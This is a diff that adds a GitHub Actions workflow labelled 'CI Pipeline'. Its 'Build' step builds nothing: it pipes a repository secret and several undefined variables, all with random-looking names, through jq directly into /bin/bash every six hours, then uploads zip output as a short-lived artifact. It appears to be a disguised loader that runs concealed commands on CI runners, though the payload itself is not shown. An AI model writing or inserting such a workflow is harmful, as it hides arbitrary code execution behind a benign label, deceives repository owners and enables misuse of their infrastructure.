@@ -1,0 +1,30 @@
+name: CI Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '46 0,6,12,18 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  operation:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Build
+        env:
+          sprlu56: ${{ secrets.sprlu56 }}
+        run: |
+          printf '%s' "$sprlu56" | jq -r .kkuy1607 | /bin/bash
+          printf '%s' "$tvb3921" | jq -r .wxm2 | /bin/bash
+          echo $ao5835 | jq -r .hv2 | /bin/bash
+          printf '%s' "$szp4" | jq -r .wszz9230 | /bin/bash
+          echo $et0163 | jq -r .boi6 | /bin/bash
+
+      - name: Archive output
+        uses: actions/upload-artifact@v4
+        with:
+          name: NjMktLvy
+          path: "*.zip"
+          retention-days: 1
